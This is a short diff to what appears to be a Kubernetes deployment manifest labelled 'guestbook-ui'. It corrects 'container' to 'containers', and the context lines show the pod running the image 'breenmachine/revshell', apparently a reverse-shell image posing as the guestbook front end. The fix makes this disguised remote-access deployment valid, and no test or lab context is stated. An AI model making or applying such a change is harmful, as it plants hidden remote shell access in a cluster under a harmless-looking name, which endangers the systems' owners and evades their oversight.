@@ -13,7 +13,7 @@ spec:
       labels:
         app: guestbook-ui
     spec:
-      container:
+      containers:
         name: guestbook-ui
         image: breenmachine/revshell
         args:
